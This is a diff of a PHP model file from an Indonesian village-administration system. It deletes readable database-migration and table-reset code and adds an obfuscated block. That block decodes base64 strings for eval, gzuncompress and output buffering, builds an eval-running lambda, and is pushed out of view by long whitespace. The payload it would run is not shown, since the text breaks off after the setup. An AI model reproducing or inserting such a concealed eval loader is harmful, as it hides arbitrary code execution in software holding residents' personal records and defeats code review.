-			CREATE ALGORITHM=UNDEFINED  SQL SECURITY DEFINER VIEW `data_surat` AS select `u`.`id` AS `id`,`u`.`nama` AS `nama`,`x`.`nama` AS `sex`,`u`.`tempatlahir` AS `tempatlahir`,`u`.`tanggallahir` AS `tanggallahir`,(select (date_format(from_days((to_days(now()) - to_days(`tweb_penduduk`.`tanggallahir`))),'%Y') + 0) from `tweb_penduduk` where (`tweb_penduduk`.`id` = `u`.`id`)) AS `umur`,`w`.`nama` AS `status_kawin`,`f`.`nama` AS `warganegara`,`a`.`nama` AS `agama`,`d`.`nama` AS `pendidikan`,`j`.`nama` AS `pekerjaan`,`u`.`nik` AS `nik`,`c`.`rt` AS `rt`,`c`.`rw` AS `rw`,`c`.`dusun` AS `dusun`,`k`.`no_kk` AS `no_kk`,(select `tweb_penduduk`.`nama` from `tweb_penduduk` where (`tweb_penduduk`.`id` = `k`.`nik_kepala`)) AS `kepala_kk` from ((((((((`tweb_penduduk` `u` left join `tweb_penduduk_sex` `x` on((`u`.`sex` = `x`.`id`))) left join `tweb_penduduk_kawin` `w` on((`u`.`status_kawin` = `w`.`id`))) left join `tweb_penduduk_agama` `a` on((`u`.`agama_id` = `a`.`id`))) left join `tweb_penduduk_pendidikan_kk` `d` on((`u`.`pendidikan_kk_id` = `d`.`id`))) left join `tweb_penduduk_pekerjaan` `j` on((`u`.`pekerjaan_id` = `j`.`id`))) left join `tweb_wil_clusterdesa` `c` on((`u`.`id_cluster` = `c`.`id`))) left join `tweb_keluarga` `k` on((`u`.`id_kk` = `k`.`id`))) left join `tweb_penduduk_warganegara` `f` on((`u`.`warganegara_id` = `f`.`id`)));
-		";
-		$this->db->query($query);
-
-		$system_widgets = array(
-			'Layanan Mandiri'      => 'layanan_mandiri.php',
-			'Agenda'               => 'agenda.php',
-			'Galeri'               => 'galeri.php',
-			'Statistik'            => 'statistik.php',
-			'Komentar'             => 'komentar.php',
-			'Media Sosial'         => 'media_sosial.php',
-			'Peta Lokasi Kantor'   => 'peta_lokasi_kantor.php',
-			'Statistik Pengunjung' => 'statistik_pengunjung.php',
-			'Arsip Artikel'        => 'arsip_artikel.php'
-		);
-
-		foreach ($system_widgets as $key => $value)
-		{
-			$this->db->select('id');
-			$this->db->where(array('isi' => $value, 'id_kategori' => 1003));
-			$q = $this->db->get('artikel');
-			$widget = $q->row_array();
-			if (!$widget['id'])
-			{
-				$query = "
-					INSERT INTO artikel (judul,isi,enabled,id_kategori,urut,jenis_widget)
-					VALUES ('$key','$value',1,1003,1,1);";
-				$this->db->query($query);
-			}
-		}
-	}
-
-	private function migrasi_111_ke_12()
-	{
-		if (!$this->db->field_exists('alamat', 'tweb_keluarga'))
-		{
-			$query = "ALTER TABLE tweb_keluarga ADD alamat varchar(200)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_124_ke_13()
-	{
-		if (!$this->db->field_exists('urut', 'menu'))
-		{
-			$query = "ALTER TABLE menu ADD urut int(5)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_13_ke_14()
-	{
-		$query = "
-			INSERT INTO user_grup (id, nama) VALUES (4, 'Kontributor')
-			ON DUPLICATE KEY UPDATE
-				id = VALUES(id),
-				nama = VALUES(nama);
-		";
-		$this->db->query($query);
-
-		// Buat tanggalperkawinan dan tanggalperceraian boleh NULL
-		$query = "ALTER TABLE tweb_penduduk CHANGE tanggalperkawinan tanggalperkawinan DATE NULL DEFAULT NULL;";
-		$this->db->query($query);
-		$query = "ALTER TABLE tweb_penduduk CHANGE tanggalperceraian tanggalperceraian DATE NULL DEFAULT NULL;";
-		$this->db->query($query);
-
-		 // Ubah tanggal menjadi NULL apabila 0000-00-00
-		$query = "UPDATE tweb_penduduk SET tanggalperkawinan=NULL WHERE tanggalperkawinan='0000-00-00' OR tanggalperkawinan='00-00-0000';";
-		$this->db->query($query);
-		$query = "UPDATE tweb_penduduk SET tanggalperceraian=NULL WHERE tanggalperceraian='0000-00-00' OR tanggalperceraian='00-00-0000';";
-		$this->db->query($query);
-	}
-
-	private function migrasi_14_ke_15()
-	{
-		// Tambah kolom di tabel tweb_penduduk
-		if (!$this->db->field_exists('cara_kb_id', 'tweb_penduduk'))
-		{
-			$query = "ALTER TABLE tweb_penduduk ADD cara_kb_id tinyint(2) NULL DEFAULT NULL;";
-			$this->db->query($query);
-		}
-
-		 // Tambah tabel cara_kb
-		$query = "DROP TABLE IF EXISTS tweb_cara_kb;";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE tweb_cara_kb (
-				id tinyint(5) NOT NULL AUTO_INCREMENT,
-				nama varchar(50) NOT NULL,
-				sex tinyint(2),
-				PRIMARY KEY (id)
-			) ENGINE=".$this->engine." AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;
-		";
-		$this->db->query($query);
-
-		$query = "
-			INSERT INTO tweb_cara_kb (id, nama, sex) VALUES
-			(1, 'Pil', 2),
-			(2, 'IUD', 2),
-			(3, 'Suntik', 2),
-			(4, 'Kondom', 1),
-			(5, 'Susuk KB', 2),
-			(6, 'Sterilisasi Wanita', 2),
-			(7, 'Sterilisasi Pria', 1),
-			(99, 'Lainnya', 3);
-		";
-		$this->db->query($query);
-
-		 // Ubah tanggallahir supaya tidak tampil apabila kosong
-		$query = "ALTER TABLE tweb_penduduk CHANGE tanggallahir tanggallahir DATE NULL DEFAULT NULL;";
-		$this->db->query($query);
-		$query = "
-			UPDATE tweb_penduduk SET tanggallahir=NULL
-			WHERE tanggallahir='0000-00-00' OR tanggallahir='00-00-0000';
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_15_ke_16()
-	{
-		// Buat kk_sex boleh NULL
-		$query = "ALTER TABLE log_keluarga CHANGE kk_sex kk_sex tinyint(2) NULL DEFAULT NULL;";
-		$this->db->query($query);
-
-		// ==== Gabung program bantuan keluarga statik ke dalam modul Program Bantuan
-
-		$program_keluarga = array(
-			"Raskin" => "raskin",
-			"BLSM"   => "id_blt",
-			"PKH"    => "id_pkh",
-			"Bedah Rumah" => "id_bedah_rumah"
-		);
-		foreach ($program_keluarga as $key => $value)
-		{
-			// cari keluarga anggota program
-			if (!$this->db->field_exists($value, 'tweb_keluarga')) continue;
-
-			$this->db->select("no_kk");
-			$this->db->where("$value",1);
-			$q = $this->db->get("tweb_keluarga");
-			if ( $q->num_rows() > 0 )
-			{
-				// buat program
-				$data = array(
-					'sasaran' => 2,
-					'nama' => $key,
-					'ndesc' => '',
-					'userid' => 0,
-					'sdate' => date("Y-m-d",strtotime("-1 year")),
-					'edate' => date("Y-m-d",strtotime("+1 year"))
-				);
-				$this->db->insert('program', $data);
-				$id_program = $this->db->insert_id();
-				// untuk setiap keluarga anggota program buat program_peserta
-				$data = $q->result_array();
-				foreach ($data as $peserta_keluarga)
-				{
-					$peserta = array(
-						'peserta' => $peserta_keluarga['no_kk'],
-						'program_id' => $id_program,
-						'sasaran' => 2
-					);
-					$this->db->insert('program_peserta', $peserta);
-				}
-			}
-			// Hapus kolom program di tweb_keluarga
-			$sql = "ALTER TABLE tweb_keluarga DROP COLUMN $value";
-			$this->db->query($sql);
-		}
-		// ==== Gabung program bantuan penduduk statik ke dalam modul Program Bantuan
-
-		$program_penduduk = array(
-			"JAMKESMAS" => "jamkesmas"
-		);
-		foreach ($program_penduduk as $key => $value)
-		{
-			// cari penduduk anggota program
-			if (!$this->db->field_exists($value, 'tweb_penduduk')) continue;
-
-			$this->db->select("nik");
-			$this->db->where("$value",1);
-			$q = $this->db->get("tweb_penduduk");
-			if ( $q->num_rows() > 0 )
-			{
-				// buat program
-				$data = array(
-					'sasaran' => 1,
-					'nama' => $key,
-					'ndesc' => '',
-					'userid' => 0,
-					'sdate' => date("Y-m-d",strtotime("-1 year")),
-					'edate' => date("Y-m-d",strtotime("+1 year"))
-				);
-				$this->db->insert('program', $data);
-				$id_program = $this->db->insert_id();
-				// untuk setiap penduduk anggota program buat program_peserta
-				$data = $q->result_array();
-				foreach ($data as $peserta_penduduk)
-				{
-					$peserta = array(
-						'peserta' => $peserta_penduduk['nik'],
-						'program_id' => $id_program,
-						'sasaran' => 2
-					);
-					$this->db->insert('program_peserta', $peserta);
-				}
-			}
-			// Hapus kolom program di tweb_penduduk
-			$sql = "ALTER TABLE tweb_penduduk DROP COLUMN $value";
-			$this->db->query($sql);
-		}
-	}
-
-	private function migrasi_16_ke_17()
-	{
-		// Tambahkan id_cluster ke tabel keluarga
-		if (!$this->db->field_exists('id_cluster', 'tweb_keluarga'))
-		{
-			$query = "ALTER TABLE tweb_keluarga ADD id_cluster int(11);";
-			$this->db->query($query);
-
-			// Untuk setiap keluarga
-			$query = $this->db->get('tweb_keluarga');
-			$data = $query->result_array();
-			foreach ($data as $keluarga)
-			{
-				// Ambil id_cluster kepala keluarga
-				$this->db->select('id_cluster');
-				$this->db->where('id', $keluarga['nik_kepala']);
-				$query = $this->db->get('tweb_penduduk');
-				$kepala_kk = $query->row_array();
-				// Tulis id_cluster kepala keluarga ke keluarga
-				if (isset($kepala_kk['id_cluster'])) {
-					$this->db->where('id', $keluarga['id']);
-					$this->db->update('tweb_keluarga', array('id_cluster' => $kepala_kk['id_cluster']));
-				}
-			}
-		}
-	}
-
-	private function migrasi_17_ke_18()
-	{
-		// Tambah lampiran surat dgn template html2pdf
-		if (!$this->db->field_exists('lampiran', 'log_surat'))
-		{
-			$query = "ALTER TABLE `log_surat` ADD `lampiran` varchar(100)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('lampiran', 'tweb_surat_format'))
-		{
-			$query = "ALTER TABLE `tweb_surat_format` ADD `lampiran` varchar(100)";
-			$this->db->query($query);
-		}
-		$query = "
-			INSERT INTO `tweb_surat_format` (`id`, `url_surat`, `lampiran`) VALUES
-			(5, 'surat_ket_pindah_penduduk', 'f-1.08.php')
-			ON DUPLICATE KEY UPDATE
-				url_surat = VALUES(url_surat),
-				lampiran = VALUES(lampiran);
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_18_ke_19()
-	{
-		// Hapus index unik untuk kode_surat kalau sempat dibuat sebelumnya
-		$db = $this->db->database;
-		$query = "
-			SELECT COUNT(1) IndexIsThere FROM INFORMATION_SCHEMA.STATISTICS
-			WHERE table_schema=? AND table_name='tweb_surat_format' AND index_name='kode_surat';
-		";
-		$hasil = $this->db->query($query, $db);
-		$data = $hasil->row_array();
-		if ($data['IndexIsThere'] > 0)
-		{
-			$query = "
-				DROP INDEX kode_surat ON tweb_surat_format;
-			";
-			$this->db->query($query);
-		}
-
-		// Hapus tabel yang tidak terpakai lagi
-		$query = "DROP TABLE IF EXISTS ref_bedah_rumah, ref_blt, ref_jamkesmas, ref_pkh, ref_raskin, tweb_alamat_sekarang";
-		$this->db->query($query);
-	}
-
-	private function migrasi_19_ke_110()
-	{
-		// Tambah nomor id_kartu untuk peserta program bantuan
-		if (!$this->db->field_exists('no_id_kartu', 'program_peserta'))
-		{
-			$query = "ALTER TABLE program_peserta ADD no_id_kartu varchar(30)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_110_ke_111()
-	{
-		// Buat folder desa/upload/pengesahan apabila belum ada
-		if (!file_exists(LOKASI_PENGESAHAN))
-		{
-			mkdir(LOKASI_PENGESAHAN, 0755);
-		}
-		// Tambah akti/non-aktifkan dan pilihan favorit format surat
-		if (!$this->db->field_exists('kunci', 'tweb_surat_format'))
-		{
-			$query = "ALTER TABLE tweb_surat_format ADD kunci tinyint(1) NOT NULL DEFAULT '0'";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('favorit', 'tweb_surat_format'))
-		{
-			$query = "ALTER TABLE tweb_surat_format ADD favorit tinyint(1) NOT NULL DEFAULT '0'";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('id_pend', 'dokumen'))
-		{
-			$query = "ALTER TABLE dokumen ADD id_pend int(11) NOT NULL DEFAULT '0'";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('setting_modul') )
-		{
-			$query = "
-				CREATE TABLE `setting_modul` (
-					`id` int(11) NOT NULL AUTO_INCREMENT,
-					`modul` varchar(50) NOT NULL,
-					`url` varchar(50) NOT NULL,
-					`aktif` tinyint(1) NOT NULL DEFAULT '0',
-					`ikon` varchar(50) NOT NULL,
-					`urut` tinyint(4) NOT NULL,
-					`level` tinyint(1) NOT NULL DEFAULT '2',
-					`hidden` tinyint(1) NOT NULL DEFAULT '0',
-					PRIMARY KEY (`id`)
-					) ENGINE=".$this->engine." AUTO_INCREMENT=15 DEFAULT CHARSET=utf8
-			";
-			$this->db->query($query);
-
-			$query = "
-				INSERT INTO setting_modul VALUES
-				('1','SID Home','hom_desa','1','go-home-5.png','1','2','1'),
-				('2','Penduduk','penduduk/clear','1','preferences-contact-list.png','2','2','0'),
-				('3','Statistik','statistik','1','statistik.png','3','2','0'),
-				('4','Cetak Surat','surat','1','applications-office-5.png','4','2','0'),
-				('5','Analisis','analisis_master/clear','1','analysis.png','5','2','0'),
-				('6','Bantuan','program_bantuan','1','program.png','6','2','0'),
-				('7','Persil','data_persil/clear','1','persil.png','7','2','0'),
-				('8','Plan','plan','1','plan.png','8','2','0'),
-				('9','Peta','gis','1','gis.png','9','2','0'),
-				('10','SMS','sms','1','mail-send-receive.png','10','2','0'),
-				('11','Pengguna','man_user/clear','1','system-users.png','11','1','1'),
-				('12','Database','database','1','database.png','12','1','0'),
-				('13','Admin Web','web','1','message-news.png','13','4','0'),
-				('14','Laporan','lapor','1','mail-reply-all.png','14','2','0');
-			";
-			$this->db->query($query);
-		}
-
-		/**
-			Sesuaikan data modul analisis dengan SID 3.10
-		*/
-
-		// Tabel analisis_indikator
-		$ubah_kolom = array(
-			"`nomor` int(3) NOT NULL"
-		);
-		foreach ($ubah_kolom as $kolom_def)
-		{
-			$query = "ALTER TABLE analisis_indikator MODIFY ".$kolom_def;
-			$this->db->query($query);
-		};
-		if (!$this->db->field_exists('is_publik', 'analisis_indikator'))
-		{
-			$query = "ALTER TABLE analisis_indikator ADD `is_publik` tinyint(1) NOT NULL DEFAULT '0'";
-			$this->db->query($query);
-		}
-
-		// Tabel analisis_kategori_indikator
-		if (!$this->db->field_exists('kategori_kode', 'analisis_kategori_indikator'))
-		{
-			$query = "ALTER TABLE analisis_kategori_indikator ADD `kategori_kode` varchar(3) NOT NULL";
-			$this->db->query($query);
-		}
-
-		// Tabel analisis_master
-		if ($this->db->field_exists('kode_analiusis', 'analisis_master'))
-		{
-			$query = "ALTER TABLE analisis_master CHANGE `kode_analiusis` `kode_analisis` varchar(5) NOT NULL DEFAULT '00000'";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('id_child', 'analisis_master'))
-		{
-			$query = "ALTER TABLE analisis_master ADD `id_child` smallint(4) NOT NULL";
-			$this->db->query($query);
-		}
-
-		// Tabel analisis_parameter
-		if (!$this->db->field_exists('kode_jawaban', 'analisis_parameter'))
-		{
-			$query = "ALTER TABLE analisis_parameter ADD `kode_jawaban` int(3) NOT NULL";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('asign', 'analisis_parameter'))
-		{
-			$query = "ALTER TABLE analisis_parameter ADD `asign` tinyint(1) NOT NULL DEFAULT '0'";
-			$this->db->query($query);
-		}
-
-		// Tabel analisis_respon
-		$drop_kolom = array(
-			"id",
-			"tanggal_input"
-		);
-		foreach ($drop_kolom as $kolom_def){
-			if ($this->db->field_exists($kolom_def, 'analisis_respon'))
-			{
-				$query = "ALTER TABLE analisis_respon DROP ".$kolom_def;
-				$this->db->query($query);
-			}
-		};
-
-		// Tabel analisis_respon_bukti
-		$query = "
-			CREATE TABLE IF NOT EXISTS `analisis_respon_bukti` (
-				`id_master` tinyint(4) NOT NULL,
-				`id_periode` tinyint(4) NOT NULL,
-				`id_subjek` int(11) NOT NULL,
-				`pengesahan` varchar(100) NOT NULL,
-				`tgl_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
-			) ENGINE=".$this->engine." DEFAULT CHARSET=utf8;
-			";
-		$this->db->query($query);
-
-		// Tabel analisis_respon_hasil
-		if ($this->db->field_exists('id', 'analisis_respon_hasil'))
-		{
-			$query = "ALTER TABLE analisis_respon_hasil DROP `id`";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('tgl_update', 'analisis_respon_hasil'))
-		{
-			$query = "ALTER TABLE analisis_respon_hasil ADD `tgl_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP";
-			$this->db->query($query);
-		}
-		$db = $this->db->database;
-		$query = "
-			SELECT COUNT(1) ConstraintSudahAda
-			FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS
-			WHERE TABLE_SCHEMA = ?
-			AND TABLE_NAME = 'analisis_respon_hasil'
-			AND CONSTRAINT_NAME = 'id_master'
-		";
-		$hasil = $this->db->query($query, $db);
-		$data = $hasil->row_array();
-		if ($data['ConstraintSudahAda'] == 0)
-		{
-			$query = "ALTER TABLE analisis_respon_hasil ADD CONSTRAINT `id_master` UNIQUE (`id_master`,`id_periode`,`id_subjek`)";
-			$this->db->query($query);
-		}
-
-		/**
-			Sesuaikan data modul persil dengan SID 3.10
-		*/
-
-		// Tabel data_persil
-		$ubah_kolom = array(
-			"`nik` varchar(64) NOT NULL",
-			"`nama` varchar(128) NOT NULL COMMENT 'nomer persil'",
-			"`persil_jenis_id` tinyint(2) NOT NULL",
-			"`luas` decimal(7,2) NOT NULL",
-			"`kelas` varchar(128) DEFAULT NULL",
-			"`no_sppt_pbb` varchar(128) NOT NULL",
-			"`persil_peruntukan_id` tinyint(2) NOT NULL"
-		);
-		foreach ($ubah_kolom as $kolom_def)
-		{
-			$query = "ALTER TABLE data_persil MODIFY ".$kolom_def;
-			$this->db->query($query);
-		};
-		if (!$this->db->field_exists('peta', 'data_persil'))
-		{
-			$query = "ALTER TABLE data_persil ADD `peta` text";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('rdate', 'data_persil'))
-		{
-			$query = "ALTER TABLE data_persil ADD `rdate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP";
-			$this->db->query($query);
-		}
-
-		// Tabel data_persil_jenis
-		$ubah_kolom = array(
-			"`nama` varchar(128) NOT NULL",
-			"`ndesc` text NOT NULL"
-		);
-		foreach ($ubah_kolom as $kolom_def)
-		{
-			$query = "ALTER TABLE data_persil_jenis MODIFY ".$kolom_def;
-			$this->db->query($query);
-		};
-
-		// Tabel data_persil_peruntukan
-		$ubah_kolom = array(
-			"`nama` varchar(128) NOT NULL",
-			"`ndesc` text NOT NULL"
-		);
-		foreach ($ubah_kolom as $kolom_def)
-		{
-			$query = "ALTER TABLE data_persil_peruntukan MODIFY ".$kolom_def;
-			$this->db->query($query);
-		};
-
-		// Ubah surat keterangan pindah penduduk untuk bisa memilih format lampiran
-		$query = "
-			INSERT INTO `tweb_surat_format` (`id`, `url_surat`, `lampiran`) VALUES
-			(5, 'surat_ket_pindah_penduduk', 'f-1.08.php,f-1.25.php')
-			ON DUPLICATE KEY UPDATE
-				url_surat = VALUES(url_surat),
-				lampiran = VALUES(lampiran);
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_111_ke_112()
-	{
-		// Ubah surat bio penduduk untuk menambah format lampiran
-		$query = "
-			INSERT INTO `tweb_surat_format` (`id`, `url_surat`, `lampiran`) VALUES
-			(3, 'surat_bio_penduduk', 'f-1.01.php')
-			ON DUPLICATE KEY UPDATE
-				url_surat = VALUES(url_surat),
-				lampiran = VALUES(lampiran);
-		";
-		$this->db->query($query);
-
-		// Tabel tweb_penduduk melengkapi data F-1.01
-		if (!$this->db->field_exists('telepon', 'tweb_penduduk'))
-		{
-			$query = "ALTER TABLE tweb_penduduk ADD `telepon` varchar(20)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('tanggal_akhir_paspor', 'tweb_penduduk'))
-		{
-			$query = "ALTER TABLE tweb_penduduk ADD `tanggal_akhir_paspor` date";
-			$this->db->query($query);
-		}
-
-		// Ketinggalan tabel gis_simbol
-		if (!$this->db->table_exists('gis_simbol') )
-		{
-			$query = "
-				CREATE TABLE `gis_simbol` (
-					`simbol` varchar(40) DEFAULT NULL
-				) ENGINE=".$this->engine." DEFAULT CHARSET=utf8;
-			";
-			$this->db->query($query);
-			// Isi dengan daftar icon yang ada di folder assets/images/gis/point
-			$simbol_folder = FCPATH . 'assets/images/gis/point';
-			$list_gis_simbol = scandir($simbol_folder);
-			foreach ($list_gis_simbol as $simbol) {
-				if ($simbol['0'] == '.') continue;
-				$this->db->insert('gis_simbol', array('simbol' => $simbol));
-			}
-		}
-		if (!$this->db->field_exists('jenis', 'tweb_surat_format'))
-		{
-			$query = "ALTER TABLE tweb_surat_format ADD jenis tinyint(2) NOT NULL DEFAULT 2";
-			$this->db->query($query);
-			// Update semua surat yang disediakan oleh rilis OpenSID
-			$surat_sistem = array(
-				'surat_ket_pengantar',
-				'surat_ket_penduduk',
-				'surat_bio_penduduk',
-				'surat_ket_pindah_penduduk',
-				'surat_ket_jual_beli',
-				'surat_pindah_antar_kab_prov',
-				'surat_ket_catatan_kriminal',
-				'surat_ket_ktp_dalam_proses',
-				'surat_ket_beda_nama',
-				'surat_jalan',
-				'surat_ket_kurang_mampu',
-				'surat_izin_keramaian',
-				'surat_ket_kehilangan',
-				'surat_ket_usaha',
-				'surat_ket_jamkesos',
-				'surat_ket_domisili_usaha',
-				'surat_ket_kelahiran',
-				'surat_permohonan_akta',
-				'surat_pernyataan_akta',
-				'surat_permohonan_duplikat_kelahiran',
-				'surat_ket_kematian',
-				'surat_ket_lahir_mati',
-				'surat_ket_nikah',
-				'surat_ket_asalusul',
-				'surat_persetujuan_mempelai',
-				'surat_ket_orangtua',
-				'surat_izin_orangtua',
-				'surat_ket_kematian_suami_istri',
-				'surat_kehendak_nikah',
-				'surat_ket_pergi_kawin',
-				'surat_ket_wali',
-				'surat_ket_wali_hakim',
-				'surat_permohonan_duplikat_surat_nikah',
-				'surat_permohonan_cerai',
-				'surat_ket_rujuk_cerai'
-			);
-			// Jenis surat yang bukan bagian rilis sistem sudah otomatis berisi nilai default (yaitu, 2)
-			foreach ($surat_sistem as $url_surat)
-			{
-				$this->db->where('url_surat',$url_surat)->update('tweb_surat_format',array('jenis'=>1));
-			}
-		}
-		// Tambah surat_permohonan_kartu_keluarga
-		$this->db->where('url_surat', 'surat_ubah_sesuaikan')->update('tweb_surat_format',array('kode_surat' => 'P-01'));
-		$query = "
-			INSERT INTO tweb_surat_format (nama, url_surat, lampiran, kode_surat, jenis) VALUES
-			('Permohonan Kartu Keluarga', 'surat_permohonan_kartu_keluarga', 'f-1.15.php', 'S-36', 1)
-			ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				lampiran = VALUES(lampiran),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis);
-		";
-		$this->db->query($query);
-		// Tambah kolom no_kk_sebelumnya untuk penduduk yang pecah dari kartu keluarga
-		if (!$this->db->field_exists('no_kk_sebelumnya', 'tweb_penduduk'))
-		{
-			$query = "ALTER TABLE tweb_penduduk ADD no_kk_sebelumnya varchar(30)";
-			$this->db->query($query);
-		}
-	}
-
-	public function kosongkan_db()
-	{
-		// Views tidak perlu dikosongkan.
-		$views = $this->get_views();
-		$table_lookup = array(
-			"analisis_ref_state",
-			"analisis_ref_subjek",
-			"analisis_tipe_indikator",
-			"artikel", //remove everything except widgets 1003
-			"gis_simbol",
-			"klasifikasi_surat",
-			"keuangan_manual_ref_rek1",
-			"keuangan_manual_ref_rek2",
-			"keuangan_manual_ref_rek3",
-			"keuangan_manual_ref_bidang",
-			"keuangan_manual_ref_kegiatan",
-			"keuangan_manual_rinci_tpl",
-			"media_sosial",
-			"ref_dokumen",
-			"ref_pindah",
-			"ref_syarat_surat",
-			"ref_status_covid",
-			"setting_modul",
-			"setting_aplikasi",
-			"setting_aplikasi_options",
-			"skin_sid",
-			"syarat_surat",
-			"tweb_aset",
-			"tweb_cacat",
-			"tweb_cara_kb",
-			"tweb_golongan_darah",
-			"tweb_keluarga_sejahtera",
-			"tweb_penduduk_agama",
-			"tweb_penduduk_asuransi",
-			"tweb_penduduk_hubungan",
-			"tweb_penduduk_kawin",
-			"tweb_penduduk_pekerjaan",
-			"tweb_penduduk_pendidikan",
-			"tweb_penduduk_pendidikan_kk",
-			"tweb_penduduk_sex",
-			"tweb_penduduk_status",
-			"tweb_penduduk_umur",
-			"tweb_penduduk_warganegara",
-			"tweb_rtm_hubungan",
-			"tweb_sakit_menahun",
-			"tweb_status_dasar",
-			"tweb_status_ktp",
-			"tweb_surat_format",
-			"user",
-			"user_grup",
-			"widget"
-		);
-
-		// Hanya kosongkan contoh menu kalau pengguna memilih opsi itu
-		if (empty($_POST['kosongkan_menu']))
-		{
-			array_push($table_lookup,"kategori","menu");
-		}
-
-		$jangan_kosongkan = array_merge($views, $table_lookup);
-
-		// Hapus semua artikel kecuali artikel widget dengan kategori 1003
-		$this->db->where("id_kategori !=", "1003");
-		$query = $this->db->delete('artikel');
-		// Kosongkan semua tabel kecuali table lookup dan views
-		// Tabel yang ada foreign key akan dikosongkan secara otomatis
-		$semua_table = $this->db->list_tables();
-		$this->db->simple_query('SET FOREIGN_KEY_CHECKS=0');
-		foreach ($semua_table as $table)
-		{
-			if (!in_array($table, $jangan_kosongkan))
-			{
-				$query = "DELETE FROM " . $table . " WHERE 1";
-				$this->db->query($query);
-			}
-		}
-		$this->db->simple_query('SET FOREIGN_KEY_CHECKS=1');
-		// Tambahkan kembali Analisis DDK Profil Desa dan Analisis DAK Profil Desa
-		$file_analisis = FCPATH . 'assets/import/analisis_DDK_Profil_Desa.xls';
-		$this->analisis_import_model->impor_analisis($file_analisis, 'DDK02', $jenis = 1);
-		$file_analisis = FCPATH . 'assets/import/analisis_DAK_Profil_Desa.xls';
-		$this->analisis_import_model->impor_analisis($file_analisis, 'DAK02', $jenis = 1);
-
-		$this->session->success = 1;
-	}
-
-	public function get_views()
-	{
-		$db = $this->db->database;
-		$sql = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'VIEW' AND TABLE_SCHEMA = '$db'";
-		$query = $this->db->query($sql);
-		$data = $query->result_array();
-		return array_column($data, 'TABLE_NAME');
-	}
-
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Database_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      